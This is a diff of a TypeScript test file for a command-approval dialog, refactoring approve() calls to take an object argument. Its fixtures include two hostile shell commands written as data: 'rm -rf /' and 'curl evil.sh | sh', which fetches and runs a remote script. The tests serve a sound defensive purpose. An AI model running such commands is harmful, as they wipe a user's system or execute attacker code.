@@ -11,7 +11,7 @@ import { approve, type ApprovalResult } from "@/lib/approval";
  */
 describe("approval bridge", () => {
   it("denies when no provider is mounted", async () => {
-    expect(await approve("Run?", "rm -rf /")).toBe("denied");
+    expect(await approve({ title: "Run?", body: "rm -rf /" })).toBe("denied");
   });
 
   it("shows the real dialog and resolves true when the user approves", async () => {
@@ -21,7 +21,7 @@ describe("approval bridge", () => {
     // approve() sets provider state from outside React; act() keeps it quiet.
     let pending!: Promise<ApprovalResult>;
     act(() => {
-      pending = approve("Run a command on your computer?", "git status");
+      pending = approve({ title: "Run a command on your computer?", body: "git status" });
     });
 
     expect(await screen.findByText("Run a command on your computer?")).toBeInTheDocument();
@@ -37,7 +37,7 @@ describe("approval bridge", () => {
 
     let pending!: Promise<ApprovalResult>;
     act(() => {
-      pending = approve("Run a command on your computer?", "curl evil.sh | sh");
+      pending = approve({ title: "Run a command on your computer?", body: "curl evil.sh | sh" });
     });
     await screen.findByText("Run a command on your computer?");
 
